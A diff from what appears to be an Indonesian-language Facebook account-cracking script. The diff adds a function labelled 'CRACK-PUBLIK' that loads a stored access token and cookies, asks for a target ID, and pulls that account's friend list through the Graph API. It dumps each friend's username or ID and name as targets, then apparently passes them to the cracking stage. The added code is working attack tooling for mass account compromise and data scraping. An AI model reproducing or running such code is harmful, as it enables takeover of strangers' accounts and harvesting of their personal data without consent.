@@ -756,8 +756,27 @@ def publikv2():
             print(e)
 
 
-#----------[ CRACK-PUBLIK  ]----------#            
+#----------[ CRACK-PUBLIK  ]----------#   
 def publik():
+	t = open('.token.txt','r').read()
+	c = open ('.cok.txt','r').read()
+	akun = input(f'╠───[{hh}!{P}] PASTIKAN ID TARGET BERSIFAT PUBLIK \n╠───[{hh}!{P}] MASUKKAN ID : ')
+	try:
+		bas = ses.get(f'https://graph.facebook.com/{akun}?fields=friends.fields(id,name,username)&access_token={t}',cookies=c).json()
+		for pi in bas['friends']['data']:
+			try:
+				try:dump.append(pi['username']+'|'+pi['name'])
+				except:dump.append(pi['id']+'|'+pi['name'])
+				print('\r╠───[{hh}!{P}] SEDANG DUMP %s ID'%(len(dump)),end=" ")
+				sys.stdout.flush()
+				time.sleep(0.0002)
+			except:continue
+		setting()
+	except (KeyError,IOError):
+		exit(f"╠───[{hh}!{P}] AKUN TIDAK PUBLIK")	
+		
+
+def publiikk():
     try:
         token = open('.token.txt','r').read()
         cok = open('.cok.txt','r').read()
